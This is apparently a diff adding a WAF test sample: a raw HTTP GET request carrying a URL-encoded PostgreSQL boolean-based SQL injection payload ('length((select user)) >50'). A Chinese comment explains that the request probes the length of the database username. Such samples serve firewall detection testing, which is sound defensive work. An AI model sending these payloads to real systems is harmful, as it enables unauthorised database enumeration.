@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _布尔注入-06506342
+# 攻击者基于布尔查询，将"length((select user)) >50"语句注入到 SQL 查询参数中，利用length()函数来获取用户名字符串长度值进行布尔比较以判断长度值。
+GET /?id=1%20and%20length%28%28select%20user%29%29%20%3E50&bid=hd_tag_m8mv23z6 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23z6
+RM-PRO-Token: 1c64a32eb40400bde4a12422ba3941e4
+RM-PRO-Time: 1742808354796
+User-Agent: curl/7.83.1
+
